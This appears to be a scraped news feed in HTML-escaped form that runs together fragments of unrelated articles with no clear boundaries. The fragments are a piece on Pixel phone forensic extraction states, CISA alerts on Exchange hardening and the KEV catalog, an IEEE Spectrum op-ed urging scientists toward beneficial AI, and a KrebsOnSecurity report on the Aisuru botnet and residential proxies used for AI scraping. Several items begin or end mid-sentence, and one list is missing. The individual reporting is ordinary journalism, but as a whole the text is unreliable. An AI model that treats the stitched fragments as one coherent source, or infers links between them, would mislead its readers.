&lt;p&gt;The screenshot includes data on the Pixel 6, Pixel 7, Pixel 8, and Pixel 9 family. It does not list the &lt;a href="https://arstechnica.com/gadgets/2025/08/google-pixel-10-series-review-dont-call-it-an-android/"&gt;Pixel 10 series&lt;/a&gt;, which launched just a few months ago. The phone support is split up into three different conditions: before first unlock, after first unlock, and unlocked. The before first unlock (BFU) state means the phone has not been unlocked since restarting, so all data is encrypted. This is traditionally the most secure state for a phone. In the after first unlock (AFU) state, data extraction is easier.

&lt;p&gt;Threat activity targeting Exchange continues to persist, and organizations with unprotected or misconfigured Exchange servers remain at high risk of compromise.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;Best practices in this guide focus on hardening user authentication and access, ensuring strong network encryption, and minimizing application attack surfaces. CISA recommends organizations also decommission any remaining end-of-life on-premises or hybrid Exchange servers after transitioning to Microsoft 365, as retaining the “last Exchange server” can expose organizations to ongoing exploitation activity.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;CISA recommends organizations implement &lt;a href="https://www.cisa.gov/resources-tools/resources/microsoft-exchange-server-security-best-practices" title="Microsoft Exchange Server Best Practices"&gt;Microsoft Exchange Server Best Practices&lt;/a&gt; and take steps to decommission end-of-life on-premises Exchange servers in hybrid environments to significantly reduce their risk from cyber threats.&amp;nbsp;&lt;/p&gt;</description><guid isPermaLink="false">/node/24131</guid></item><item><title>CISA Adds Two Known Exploited Vulnerabilities to Catalog</title><link>https://www.cisa.gov/news-events/alerts/2025/10/30/cisa-adds-two-known-exploited-vulnerabilities-catalog</link><description>&lt;p&gt;CISA has added two new vulnerabilities to its &lt;a class="Hyperlink SCXW249232855 BCX8" href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" rel="noreferrer noopener" target="_blank" title="Known Exploited Vulnerabilities (KEV) Catalog"&gt;&lt;u&gt;Known Exploited Vulnerabilities (KEV) Catalog&lt;/u&gt;&lt;/a&gt;, based on evidence of active exploitation.&lt;/p&gt;

&lt;/ul&gt;
&lt;div class="OutlineElement Ltr SCXW115528803 BCX8"&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;

BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the &lt;a class="Hyperlink SCXW115528803 BCX8" href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" rel="noreferrer noopener" target="_blank" title="BOD 22-01 Fact Sheet"&gt;&lt;u&gt;BOD 22-01 Fact Sheet&lt;/u&gt;&lt;/a&gt; for more information.&amp;nbsp;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="OutlineElement Ltr SCXW115528803 BCX8"&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of &lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" title="Known Exploited Vulnerabilities Catalog"&gt;&lt;u&gt;KEV Catalog vulnerabilities&lt;/u&gt;&lt;/a&gt; as part of their vulnerability management practice.

The industry is also affecting an already-roiling climate with its &lt;a href="https://spectrum.ieee.org/ai-energy-use"&gt;enormous energy demands&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Meanwhile, particularly in the &lt;a href="https://spectrum.ieee.org/tag/united-states"&gt;United States&lt;/a&gt;, public investment in science seems to be &lt;a href="https://www.aau.edu/newsroom/leading-research-universities-report/white-house-proposes-steep-cuts-science-and-education"&gt;redirected&lt;/a&gt; and &lt;a href="https://www.aip.org/fyi/trump-plan-highlights-ai-for-science"&gt;concentrated&lt;/a&gt; on AI at the expense of other disciplines. And &lt;a href="https://spectrum.ieee.org/tag/big-tech"&gt;Big Tech&lt;/a&gt; companies are consolidating their control over the AI ecosystem. In these ways and others, AI seems to be making everything worse.&lt;/p&gt;
&lt;p&gt;This is not the whole story. We should not resign ourselves to AI being harmful to humanity. None of us should accept this as inevitable, especially those in a position to influence science, government, and society. Scientists and engineers can push AI towards a beneficial path. Here&amp;#8217;s how.&lt;/p&gt;
&lt;h3&gt;The Academy&amp;#8217;s View of AI&lt;/h3&gt;
&lt;p&gt;A &lt;a href="https://www.pewresearch.org/internet/2025/04/03/how-the-us-public-and-ai-experts-view-artificial-intelligence/"&gt;Pew study&lt;/a&gt; in April found that 56 percent of AI experts (authors and presenters of AI-related conference papers) predict that AI will have positive effects on society. But that optimism doesn&amp;#8217;t extend to the scientific community at large. A 2023 &lt;a href="https://sci-ops.org/survey/artificial-intelligence-survey-x/scientists-perceptions-and-personal-use/"&gt;survey&lt;/a&gt; of 232 scientists by the Center for Science, Technology and &lt;a href="https://spectrum.ieee.org/tag/environmental-policy"&gt;Environmental Policy&lt;/a&gt; Studies at Arizona State University found more concern than excitement about the use of &lt;a href="https://spectrum.ieee.org/tag/generative-ai"&gt;generative AI&lt;/a&gt; in daily life&amp;#8212;by nearly a three to one ratio.&lt;/p&gt;
&lt;p&gt;We have encountered this sentiment repeatedly. Our careers of diverse applied work have brought us in contact with many research communities: privacy, &lt;a href="https://spectrum.ieee.org/tag/cybersecurity"&gt;cybersecurity&lt;/a&gt;, physical sciences, &lt;a href="https://spectrum.ieee.org/tag/drug-discovery"&gt;drug discovery&lt;/a&gt;, &lt;a href="https://spectrum.ieee.org/tag/public-health"&gt;public health&lt;/a&gt;, public interest technology, and democratic innovation. In all of these fields, we&amp;#8217;ve found strong negative sentiment about the impacts of AI. The feeling is so palpable that we&amp;#8217;ve often been asked to represent the voice of the AI optimist, even though we spend most of our time writing about the need to reform the structures of AI development.&lt;/p&gt;
&lt;p&gt;We understand why these audiences see AI as a destructive force, but this negativity engenders a different concern: that those with the potential to guide the development of AI and steer its influence on society will view it as a lost cause and sit out that process.&lt;/p&gt;
&lt;h3&gt;Elements of a Positive Vision for AI&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.islandinstitute.org/working-waterfront/hope-a-framework-for-climate-action/"&gt;Many&lt;/a&gt; &lt;a href="https://time.com/7178677/climate-scientist-optimist-refuse-to-give-up-hope/"&gt;have&lt;/a&gt; &lt;a href="https://www.nature.com/articles/s41467-018-05977-w"&gt;a&lt;/a&gt;&lt;a href="https://www.nature.com/articles/s41467-018-05977-w"&gt;rgu&lt;/a&gt;&lt;a href="https://www.nature.com/articles/s41467-018-05977-w"&gt;ed&lt;/a&gt; &lt;a href="https://behavioralscientist.org/we-need-to-change-the-way-we-talk-about-climate-change/"&gt;that&lt;/a&gt; &lt;a href="https://www.forbes.com/sites/avivahwittenbergcox/2023/04/17/the-power-of-climate-optimists-flip-the-narrative-change-the-future/"&gt;turn&lt;/a&gt;&lt;a href="https://www.forbes.com/sites/avivahwittenbergcox/2023/04/17/the-power-of-climate-optimists-flip-the-narrative-change-the-future/"&gt;ing&lt;/a&gt; the &lt;a href="https://climate.mit.edu/podcasts/making-case-climate-optimism"&gt;tide&lt;/a&gt; of climate action requires clearly articulating a path towards positive outcomes. In the same way, while scientists and technologists should anticipate, warn against, and help mitigate the potential harms of AI, they should also highlight the ways the technology can be harnessed for good, galvanizing public action towards those ends.&lt;/p&gt;
&lt;p&gt;There are myriad ways to leverage and reshape AI to improve peoples&amp;#8217; lives, distribute rather than concentrate power, and even strengthen democratic processes. Many examples have arisen from the scientific community and deserve to be celebrated.&lt;/p&gt;
&lt;p&gt;Some examples: AI is eliminating communication barriers across languages, including under-resourced contexts like &lt;a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5230744"&gt;marginalized sign languages&lt;/a&gt; and &lt;a href="https://ojs.bilpub.com/index.php/card/article/view/517"&gt;indigenous African languages&lt;/a&gt;. It is helping policymakers incorporate the viewpoints of many constituents through AI-assisted &lt;a href="https://www.science.org/doi/abs/10.1126/science.adq2852"&gt;deliberations&lt;/a&gt; and &lt;a href="https://static.ie.edu/CGC/AI4D%20Paper%203%20Applications%20of%20Artificial%20Intelligence%20Tools%20to%20Engance%20Legislative%20Engagement.pdf"&gt;legislative engagement&lt;/a&gt;. &lt;a href="https://spectrum.ieee.org/tag/large-language-models"&gt;Large language models&lt;/a&gt; can scale individual dialogs to &lt;a href="https://osf.io/mqcwj_v1/"&gt;a&lt;/a&gt;&lt;a href="https://osf.io/mqcwj_v1/"&gt;ddress&lt;/a&gt;&lt;a href="https://osf.io/mqcwj_v1/"&gt; climate&lt;/a&gt;&lt;a href="https://osf.io/mqcwj_v1/"&gt;&amp;#8211;&lt;/a&gt;&lt;a href="https://osf.io/mqcwj_v1/"&gt;change skepticism&lt;/a&gt;, spreading accurate information at a critical moment. National labs are building AI &lt;a href="https://www.anl.gov/cels/auroragpt-foundation-models-for-science"&gt;foundation models&lt;/a&gt; to accelerate scientific research. And throughout the fields of medicine and biology, &lt;a href="https://spectrum.ieee.org/tag/machine-learning"&gt;machine learning&lt;/a&gt; is solving scientific problems like the prediction of protein structure in aid of drug discovery, which was recognized with a &lt;a href="https://www.nobelprize.org/prizes/chemistry/2024/press-release/"&gt;Nobel Prize&lt;/a&gt; in 2024.&lt;/p&gt;
&lt;p&gt;While each of these applications is nascent and surely imperfect, they all demonstrate that AI can be wielded to advance the public interest. Scientists should embrace, champion, and expand on such efforts.&lt;/p&gt;
&lt;h3&gt;A Call to Action for Scientists&lt;/h3&gt;
&lt;p&gt;In our new book, &lt;em&gt;&lt;a href="https://mitpress.mit.edu/9780262049948/rewiring-democracy/"&gt;Rewiring Democracy: How AI Will Transform Our Politics, Government, and Citizenship&lt;/a&gt;&lt;/em&gt;, we describe four key actions for policymakers committed to steering AI toward the public good.&lt;/p&gt;
&lt;p&gt;These apply to scientists as well. Researchers should work to &lt;strong&gt;reform&lt;/strong&gt; the AI industry to be more ethical, equitable, and trustworthy. We must collectively &lt;a href="https://www.unesco.org/en/legal-affairs/recommendation-ethics-artificial-intelligence"&gt;develop&lt;/a&gt; &lt;a href="https://www.pnas.org/doi/10.1073/pnas.2407886121"&gt;ethical&lt;/a&gt; &lt;a href="https://link.springer.com/article/10.1007/s43681-024-00493-8"&gt;norms&lt;/a&gt; for research that advance and applies AI, and should use and draw attention to AI developers who adhere to those norms.&lt;/p&gt;
&lt;p&gt;Second, we should &lt;strong&gt;resist&lt;/strong&gt; harmful uses of AI by documenting the negative applications of AI and casting a light on inappropriate uses.&lt;/p&gt;
&lt;p&gt;Third, we should &lt;strong&gt;responsibly use&lt;/strong&gt; AI to make society and peoples&amp;#8217; lives better, exploiting its capabilities to help the communities they serve.&lt;/p&gt;
&lt;p&gt;And finally, we must advocate for the &lt;strong&gt;renovation&lt;/strong&gt; of institutions to prepare them for the impacts of AI; universities, professional societies, and democratic organizations are all vulnerable to disruption.&lt;/p&gt;
&lt;p&gt;Scientists have a special privilege and responsibility: We are close to the technology itself and therefore well positioned to influence its trajectory. We must work to create an AI-infused world that we want to live in. Technology, as the historian &lt;a href="https://www.jstor.org/stable/3105385"&gt;Melvin Kranzberg observed&lt;/a&gt;, &amp;#8220;is neither good nor bad; nor is it neutral.&amp;#8221; Whether the AI we build is detrimental or beneficial to society depends on the choices we make today. But we cannot create a positive future without a vision of what it looks like.&lt;/p&gt;

Experts say a glut of proxies from Aisuru and other sources is fueling large-scale data harvesting efforts tied to various artificial intelligence (AI) projects, helping content scrapers evade detection by routing their traffic through residential connections that appear to be regular Internet users.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Image credit: vxdb" class="aligncenter wp-image-72438" height="415" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/aisuru-ipidea.png" width="749" /&gt;&lt;/p&gt;
&lt;p&gt;First identified in August 2024, Aisuru has spread to at least 700,000 IoT systems, such as poorly secured Internet routers and security cameras. Aisuru&amp;#8217;s overlords have used their massive botnet to clobber targets with headline-grabbing DDoS attacks, flooding targeted hosts with blasts of junk requests from all infected systems simultaneously.&lt;/p&gt;
&lt;p&gt;In June, Aisuru hit KrebsOnSecurity.com with a DDoS &lt;a href="https://krebsonsecurity.com/2025/05/krebsonsecurity-hit-with-near-record-6-3-tbps-ddos/" rel="noopener" target="_blank"&gt;clocking at 6.3 terabits per second&lt;/a&gt; &amp;#8212; the biggest attack that &lt;strong&gt;Google&lt;/strong&gt; had ever mitigated at the time. In the weeks and months that followed, Aisuru&amp;#8217;s operators demonstrated DDoS capabilities of nearly 30 terabits of data per second &amp;#8212; well beyond the attack mitigation capabilities of most Internet destinations.&lt;/p&gt;
&lt;p&gt;These digital sieges have been particularly disruptive this year for U.S.-based Internet service providers (ISPs), in part because Aisuru recently succeeded in &lt;a href="https://krebsonsecurity.com/2025/10/ddos-botnet-aisuru-blankets-us-isps-in-record-ddos/" rel="noopener" target="_blank"&gt;taking over a large number of IoT devices in the United States&lt;/a&gt;. And when Aisuru launches attacks, the volume of outgoing traffic from infected systems on these ISPs is often so high that it can disrupt or degrade Internet service for adjacent (non-botted) customers of the ISPs.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Multiple broadband access network operators have experienced significant operational impact due to outbound DDoS attacks in excess of 1.5Tb/sec launched from Aisuru botnet nodes residing on end-customer premises,&amp;#8221; wrote &lt;strong&gt;Roland Dobbins&lt;/strong&gt;, principal engineer at &lt;strong&gt;Netscout&lt;/strong&gt;, in a recent &lt;a href="https://www.netscout.com/blog/asert/asert-threat-summary-aisuru-and-related-turbomirai-botnet-ddos" rel="noopener" target="_blank"&gt;executive summary on Aisuru&lt;/a&gt;. &amp;#8220;Outbound/crossbound attack traffic exceeding 1Tb/sec from compromised customer premise equipment (CPE) devices has caused significant disruption to wireline and wireless broadband access networks. High-throughput attacks have caused chassis-based router line card failures.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The incessant attacks from Aisuru have caught the attention of federal authorities in the United States and Europe (many of Aisuru&amp;#8217;s victims are customers of ISPs and hosting providers based in Europe). Quite recently, some of the world&amp;#8217;s largest ISPs have started informally sharing block lists identifying the rapidly shifting locations of the servers that the attackers use to control the activities of the botnet.&lt;/p&gt;
&lt;p&gt;Experts say the Aisuru botmasters recently updated their malware so that compromised devices can more easily be rented to so-called &amp;#8220;&lt;strong&gt;residential proxy&lt;/strong&gt;&amp;#8221; providers. These proxy services allow paying customers to route their Internet communications through someone else&amp;#8217;s device, providing anonymity and the ability to appear as a regular Internet user in almost any major city worldwide.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter wp-image-31323" height="264" src="https://krebsonsecurity.com/wp-content/uploads/2015/06/proxy.png" width="631" /&gt;&lt;/p&gt;
&lt;p&gt;From a website’s perspective, the IP traffic of a residential proxy network user appears to originate from the rented residential IP address, not from the proxy service customer. Proxy services can be used in a legitimate manner for several business purposes — such as price comparisons or sales intelligence. But they are massively abused for hiding cybercrime activity (think advertising fraud, credential stuffing) because they can make it difficult to trace malicious traffic to its original source.&lt;/p&gt;
&lt;p&gt;And as we&amp;#8217;ll see in a moment, this entire shadowy industry appears to be shifting its focus toward enabling aggressive content scraping activity that continuously feeds raw data into large language models (LLMs) built to support various AI projects.&lt;/p&gt;
&lt;h2&gt;&amp;#8216;INSANE&amp;#8217; GROWTH&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Riley Kilmer&lt;/strong&gt; is co-founder of &lt;a href="https://spur.us" rel="noopener" target="_blank"&gt;spur.us&lt;/a&gt;, a service that tracks proxy networks. Kilmer said all of the top proxy services have grown substantially over the past six months.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I just checked, and in the last 90 days we&amp;#8217;ve seen 250 million unique residential proxy IPs,&amp;#8221; Kilmer said. &amp;#8220;That is insane. That is so high of a number, it&amp;#8217;s unheard of. These proxies are absolutely everywhere now.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Today, Spur says it is tracking an unprecedented spike in available proxies across all providers, including;&lt;/p&gt;
&lt;p&gt;LUMINATI_PROXY    11,856,421&lt;br /&gt;
NETNUT_PROXY    10,982,458&lt;br /&gt;
ABCPROXY_PROXY    9,294,419&lt;br /&gt;
OXYLABS_PROXY     6,754,790&lt;br /&gt;
IPIDEA_PROXY     3,209,313&lt;br /&gt;
EARNFM_PROXY    2,659,913&lt;br /&gt;
NODEMAVEN_PROXY    2,627,851&lt;br /&gt;
INFATICA_PROXY    2,335,194&lt;br /&gt;
IPROYAL_PROXY    2,032,027&lt;br /&gt;
YILU_PROXY    1,549,155&lt;span id="more-72424"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Reached for comment about the apparent rapid growth in their proxy network, Oxylabs (#4 on Spur&amp;#8217;s list) said while their proxy pool did grow recently, it did so at nowhere near the rate cited by Spur.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We don’t systematically track other providers’ figures, and we’re not aware of any instances of 10× or 100× growth, especially when it comes to a few bigger companies that are legitimate businesses,&amp;#8221; the company said in a written statement.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bright Data&lt;/strong&gt; was formerly known as &lt;strong&gt;Luminati Networks&lt;/strong&gt;, the name that is currently at the top of Spur&amp;#8217;s list of the biggest residential proxy networks. Bright Data likewise told KrebsOnSecurity that Spur&amp;#8217;s current estimates of its proxy network are dramatically overstated and inaccurate.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We did not actively initiate nor do we see any 10x or 100x expansion of our network, which leads me to believe that someone might be presenting these IPs as Bright Data&amp;#8217;s in some way,&amp;#8221; said &lt;strong&gt;Rony Shalit&lt;/strong&gt;, Bright Data&amp;#8217;s chief compliance and ethics officer. &amp;#8220;In many cases in the past, due to us being the leading data collection proxy provider, IPs were falsely tagged as being part of our network, or while being used by other proxy providers for malicious activity.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;Our network is only sourced from verified IP providers and &lt;a href="https://brightdata.com/trustcenter/bright-sdk-ethical-data-practices" rel="noopener" target="_blank"&gt;a robust opt-in only residential peers&lt;/a&gt;, which we work hard and in complete transparency to obtain,&amp;#8221; Shalit continued. &amp;#8220;Every DC, ISP or SDK partner is reviewed and approved, and every residential peer must actively opt in to be part of our network.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;HK NETWORK&lt;/h2&gt;
&lt;p&gt;Even Spur acknowledges that Luminati and Oxylabs are unlike most other proxy services on their top proxy providers list, in that these providers actually adhere to &amp;#8220;know-your-customer&amp;#8221; policies, such as requiring video calls with all customers, and strictly blocking customers from reselling access.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Benjamin Brundage&lt;/strong&gt; is founder of &lt;a href="https://synthient.com" rel="noopener" target="_blank"&gt;Synthient&lt;/a&gt;, a startup that helps companies detect proxy networks. Brundage said if there is increasing confusion around which proxy networks are the most worrisome, it&amp;#8217;s because nearly all of these lesser-known proxy services have evolved into highly incestuous bandwidth resellers. What&amp;#8217;s more, he said, some proxy providers do not appreciate being tracked and have been known to take aggressive steps to confuse systems that scan the Internet for residential proxy nodes.&lt;/p&gt;
&lt;p&gt;Brundage said most proxy services today have created their own &lt;strong&gt;software development kit&lt;/strong&gt; or SDK that other app developers can bundle with their code to earn revenue. These SDKs quietly modify the user&amp;#8217;s device so that some portion of their bandwidth can be used to forward traffic from proxy service customers.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Proxy providers have pools of constantly churning IP addresses,&amp;#8221; he said. &amp;#8220;These IP addresses are sourced through various means, such as bandwidth-sharing apps, botnets, Android SDKs, and more. These providers will often either directly approach resellers or offer a reseller program that allows users to resell bandwidth through their platform.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Many SDK providers say they require full consent before allowing their software to be installed on end-user devices. Still, those opt-in agreements and consent checkboxes may be little more than a formality for cybercriminals like the Aisuru botmasters, who can earn a commission each time one of their infected devices is &lt;em&gt;forced to install&lt;/em&gt; some SDK that enables one or more of these proxy services.&lt;/p&gt;
&lt;p&gt;Depending on its structure, a single provider may operate hundreds of different proxy pools at a time &amp;#8212; all maintained through other means, Brundage said.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Often, you&amp;#8217;ll see resellers maintaining their own proxy pool in addition to an upstream provider,&amp;#8221; he said. &amp;#8220;It allows them to market a proxy pool to high-value clients and offer an unlimited bandwidth plan for cheap reduce their own costs.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Some proxy providers appear to be directly in league with botmasters. Brundage identified one proxy seller that was aggressively advertising cheap and plentiful bandwidth to content scraping companies. After scanning that provider&amp;#8217;s pool of available proxies, Brundage said he found a one-to-one match with IP addresses he&amp;#8217;d previously mapped to the Aisuru botnet.&lt;/p&gt;
&lt;p&gt;Brundage says that by almost any measurement, the world&amp;#8217;s largest residential proxy service is &lt;strong&gt;IPidea&lt;/strong&gt;, a China-based proxy network. IPidea is #5 on Spur&amp;#8217;s Top 10, and Brundage said its brands include &lt;strong&gt;ABCProxy &lt;/strong&gt;(#3), &lt;strong&gt;Roxlabs&lt;/strong&gt;, &lt;strong&gt;LunaProxy&lt;/strong&gt;, &lt;strong&gt;PIA S5 Proxy&lt;/strong&gt;, &lt;strong&gt;PyProxy&lt;/strong&gt;, &lt;strong&gt;922Proxy&lt;/strong&gt;, &lt;strong&gt;360Proxy&lt;/strong&gt;, &lt;strong&gt;IP2World&lt;/strong&gt;, and &lt;strong&gt;Cherry Proxy. &lt;/strong&gt;Spur&amp;#8217;s Kilmer said they also track &lt;strong&gt;Yilu Proxy &lt;/strong&gt;(#10) as IPidea.&lt;/p&gt;
&lt;p&gt;Brundage said all of these providers operate under a corporate umbrella known on the cybercrime forums as &amp;#8220;&lt;strong&gt;HK Network&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;The way it works is there&amp;#8217;s this whole reseller ecosystem, where IPidea will be incredibly aggressive and approach all these proxy providers with the offer, &amp;#8216;Hey, if you guys buy bandwidth from us, we&amp;#8217;ll give you these amazing reseller prices,'&amp;#8221; Brundage explained. &amp;#8220;But they&amp;#8217;re also very aggressive in recruiting resellers for their apps.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72441" style="width: 760px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/10/synthient-hknetwork.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-72441" height="517" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/synthient-hknetwork.png" width="750" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-72441"&gt;A graphic depicting the relationship between proxy providers that Synthient found are white labeling IPidea proxies. Image: Synthient.com.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Those apps include a range of low-cost and &amp;#8220;free&amp;#8221; virtual private networking (VPN) services that indeed allow users to enjoy a free VPN, but which also turn the user&amp;#8217;s device into a traffic relay that can be rented to cybercriminals, or else parceled out to countless other proxy networks.&lt;/p&gt;
&lt;p&gt;&amp;#8220;They have all this bandwidth to offload,&amp;#8221; Brundage said of IPidea and its sister networks. &amp;#8220;And they can do it through their own platforms, or they go get resellers to do it for them by advertising on sketchy hacker forums to reach more people.&amp;#8221;&lt;/p&gt;
&lt;p&gt;One of IPidea&amp;#8217;s core brands is &lt;strong&gt;922S5Proxy&lt;/strong&gt;, which is a not-so-subtle nod to the &lt;strong&gt;911S5Proxy&lt;/strong&gt; service that was hugely popular between 2015 and 2022. In July 2022, KrebsOnSecurity published &lt;a href="https://krebsonsecurity.com/2022/07/a-deep-dive-into-the-residential-proxy-service-911/" rel="noopener" target="_blank"&gt;a deep dive into 911S5Proxy&amp;#8217;s origins and apparent owners in China&lt;/a&gt;. Less than a week later, 911S5Proxy announced it was closing down after &lt;a href="https://krebsonsecurity.com/2022/07/911-proxy-service-implodes-after-disclosing-breach/" rel="noopener" target="_blank"&gt;the company&amp;#8217;s servers were massively hacked&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;That 2022 story named &lt;strong&gt;Yunhe Wang&lt;/strong&gt; from Beijing as the apparent owner and/or manager of the 911S5 proxy service. In May 2024, the &lt;strong&gt;U.S. Department of Justice&lt;/strong&gt; &lt;a href="https://krebsonsecurity.com/2024/05/treasury-sanctions-creators-of-911-s5-proxy-botnet/" rel="noopener" target="_blank"&gt;arrested Mr Wang&lt;/a&gt;, alleging that his network was used to steal billions of dollars from financial institutions, credit card issuers, and federal lending programs. At the same time, the U.S. Treasury Department announced sanctions against Wang and two other Chinese nationals for operating 911S5Proxy.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_72454" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-72454" height="494" src="https://krebsonsecurity.com/wp-content/uploads/2025/10/922proxy.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-72454"&gt;The website for 922Proxy.&lt;/p&gt;&lt;/div&gt;
&lt;h2&gt;DATA SCRAPING FOR AI&lt;/h2&gt;
&lt;p&gt;In recent months, multiple experts who track botnet and proxy activity have shared that a great deal of content scraping which ultimately benefits AI companies is now leveraging these proxy networks to further obfuscate their aggressive data-slurping activity. That&amp;#8217;s because by routing it through residential IP addresses, content scraping firms can make their traffic far trickier to filter out.&lt;/p&gt;
&lt;p&gt;&amp;#8220;It&amp;#8217;s really difficult to block, because there&amp;#8217;s a risk of blocking real people,&amp;#8221; Spur&amp;#8217;s Kilmer said of the LLM scraping activity that is fed through individual residential IP addresses, which are often shared by multiple customers at once.&lt;/p&gt;
&lt;p&gt;Kilmer says the AI industry has brought a veneer of legitimacy to residential proxy business, which has heretofore mostly been associated with sketchy affiliate money making programs, automated abuse, and unwanted Internet traffic.&lt;/p&gt;
&lt;p&gt;&lt;span class="pullquote pqleft"&gt;&amp;#8220;Web crawling and scraping has always been a thing, but AI made it like a commodity, data that had to be collected,&amp;#8221; Kilmer said.&lt;/span&gt; &amp;#8220;Everybody wanted to monetize their own data pots, and how they monetize that is different across the board.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Kilmer said many LLM-related scrapers rely on residential proxies in cases where the content provider has restricted access to their platform in some way, such as forcing interaction through an app, or keeping all content behind a login page with multi-factor authentication.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Where the cost of data is out of reach &amp;#8212; there is some exclusivity or reason they can&amp;#8217;t access the data &amp;#8212; they&amp;#8217;ll turn to residential proxies so they look like a real person accessing that data,&amp;#8221; Kilmer said of the content scraping efforts.&lt;/p&gt;
&lt;p&gt;Aggressive AI crawlers increasingly &lt;a href="https://arstechnica.com/ai/2025/03/devs-say-ai-crawlers-dominate-traffic-forcing-blocks-on-entire-countries/" rel="noopener" target="_blank"&gt;are overloading community-maintained infrastructure&lt;/a&gt;, causing what amounts to persistent DDoS attacks on vital public resources. A &lt;a href="https://thelibre.news/foss-infrastructure-is-under-attack-by-ai-companies/" rel="noopener" target="_blank"&gt;report&lt;/a&gt; earlier this year from &lt;strong&gt;LibreNews&lt;/strong&gt; found some open-source projects now see as much as 97 percent of their traffic originating from AI company bots, dramatically increasing bandwidth costs, service instability, and burdening already stretched-thin maintainers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cloudflare&lt;/strong&gt; is now experimenting with tools that will allow content creators to charge a fee to AI crawlers to scrape their websites. The company&amp;#8217;s &amp;#8220;&lt;a href="https://developers.cloudflare.com/ai-crawl-control/features/pay-per-crawl/what-is-pay-per-crawl/" rel="noopener" target="_blank"&gt;pay-per-crawl&lt;/a&gt;&amp;#8221; feature is currently in a private beta, and it lets publishers set their own prices that bots must pay before scraping content.&lt;/p&gt;
&lt;p&gt;On October 22, the social media and news network &lt;strong&gt;Reddit&lt;/strong&gt; &lt;a href="https://redditinc.com/hubfs/Reddit%20Inc/Content/Reddit%20v.%20SerpApi.pdf" rel="noopener" target="_blank"&gt;sued Oxylabs (PDF)&lt;/a&gt; and several other proxy providers, alleging that their systems enabled the mass-scraping of Reddit user content even though Reddit had taken steps to block such activity.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Recognizing that Reddit denies scrapers like them access to its site, Defendants scrape the data from Google’s search results instead,&amp;#8221; the lawsuit alleges. &amp;#8220;They do so by masking their identities, hiding their locations, and disguising their web scrapers as regular people (among other techniques) to circumvent or bypass the security restrictions meant to stop them.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Denas Grybauskas&lt;/strong&gt;, chief governance and strategy officer at Oxylabs, said the company was shocked and disappointed by the lawsuit.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Reddit has made no attempt to speak with us directly or communicate any potential concerns,&amp;#8221; Grybauskas said in a written statement. &amp;#8220;Oxylabs has always been and will continue to be a pioneer and an industry leader in public data collection, and it will not hesitate to defend itself against these allegations. Oxylabs’ position is that no company should claim ownership of public data that does not belong to them. It is possible that it is just an attempt to sell the same public data at an inflated price.&amp;#8221;&lt;/p&gt;
&lt;p&gt;As big and powerful as Aisuru may be, it is hardly the only botnet that is contributing to the overall broad availability of residential proxies. For example, on June 5 the FBI’s &lt;strong&gt;Internet Crime Complaint Center&lt;/strong&gt; &lt;a href="https://www.ic3.gov/PSA/2025/PSA250605" rel="noopener" target="_blank"&gt;warned&lt;/a&gt; that an IoT malware threat dubbed &lt;a href="https://www.humansecurity.com/learn/blog/satori-threat-intelligence-disruption-badbox-2-0/" rel="noopener" target="_blank"&gt;BADBOX 2.0&lt;/a&gt; had compromised millions of smart-TV boxes, digital projectors, vehicle infotainment units, picture frames, and other IoT devices.&lt;/p&gt;
